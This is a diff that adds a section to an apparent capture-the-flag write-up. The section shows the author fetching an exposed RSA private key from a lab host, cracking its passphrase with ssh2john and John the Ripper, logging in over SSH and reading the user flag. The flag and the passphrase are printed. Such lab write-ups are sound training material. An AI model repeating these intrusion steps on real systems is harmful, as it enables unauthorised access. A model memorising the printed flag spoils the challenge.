@@ -82,5 +82,69 @@ When we click it, it takes us to the upload directory which have following direc
 We found the directory \secret
 
 We have a secret key
+RSA key
+
+```
+wget "http://10.10.174.135/secret/secretKey"
+```
+Run the command to make key accessible
+```
+chmod 600 secretKey
+```
+In our rustscan, we see there is ssh open
+
+Now we have potential username, password and key
+
+We can try ssh into the machine.
+
+And the key need a passphrase
+So, we have password list we will use john the ripper
+
+```
+ssh2john secretKey > john.txt
+```
+```
+john john.txt --wordlist=dict.lst
+```
+
+And we get the password - `letmein`
+
+So we start the ssh
+
+```
+ssh -i secretKey john@10.10.174.135
+Enter passphrase for key 'secretKey': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jul  3 16:12:39 UTC 2025
+
+  System load:  0.0               Processes:           105
+  Usage of /:   41.1% of 9.78GB   Users logged in:     0
+  Memory usage: 17%               IP address for ens5: 10.10.174.135
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
+john@exploitable:~$ ls
+user.txt
+john@exploitable:~$ cat user.txt
+a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+
+```
+And we get the first user flag here
+
+What is the user flag?
+`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`
+
+Now we can do the further enumeration
+
 
 
